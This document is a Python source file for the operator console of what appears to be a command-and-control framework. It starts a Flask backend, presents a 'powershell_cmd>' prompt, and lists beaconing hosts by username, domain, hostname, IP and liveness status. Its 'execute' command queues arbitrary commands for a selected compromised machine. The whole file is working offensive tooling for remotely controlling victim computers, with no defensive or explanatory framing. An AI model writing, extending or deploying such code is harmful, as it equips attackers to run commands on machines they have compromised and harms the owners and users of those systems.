from colorama import Fore,init
from prettytable import PrettyTable
import threading
import datetime

init(wrap=True,autoreset=True)

class Main(object):
    def __init__(self):
        helps={"show options":self.show,"execute":self.execute}
        self.runs=__import__("main",fromlist=True)
        flaskrun=getattr(self.runs,"run")
        t=threading.Thread(target=flaskrun,args=())
        t.setDaemon(True)
        t.start()
        t.join(1)
        while True:
            user=input('powershell_cmd>')
            if user=='exit':
                print(Fore.BLUE+'exit shell')
                break
            elif user in helps:
                helps[user](user)
            elif user.split(' ')[0] in helps:
                helps[user.split(' ')[0]](user)

    def is_computer_exists(self,datalists):
        minutes=-1 #时间减去的分钟
        end = datetime.datetime.now() + datetime.timedelta(minutes=minutes)
        end = end.strftime("%Y-%m-%d %H:%M")
        for b in datalists:
            value=b['value']
            time=value['time']
            if time<end:
                value['status']=Fore.RED+"Death"


    def show(self,*args):
        table=PrettyTable(["username","domain","hostname","ip","id","status","Last request time"])
        table.add_row(["------","------","------","------","------","------","------"])
        options=getattr(self.runs,"beacon")
        self.is_computer_exists(options)
        if len(options)>0:
            for option in options:
                table.add_row([option["value"]['username'],option["value"]['domain'],option["value"]['hostname'],option["value"]['ip'],option["value"]['id'],option["value"]['status'],option["value"]["time"]])
        else:
            pass
        table.border=0
        print(table)
        print('')

    def execute(self,*args):
        data=str(args[0]).split(' ')
        del data[0]
        uid=data[0]
        command=data[1]
        options = getattr(self.runs,"addcommands")
        options({"uid":uid,"func":"execute","args":command})



if __name__ == '__main__':
    obj=Main()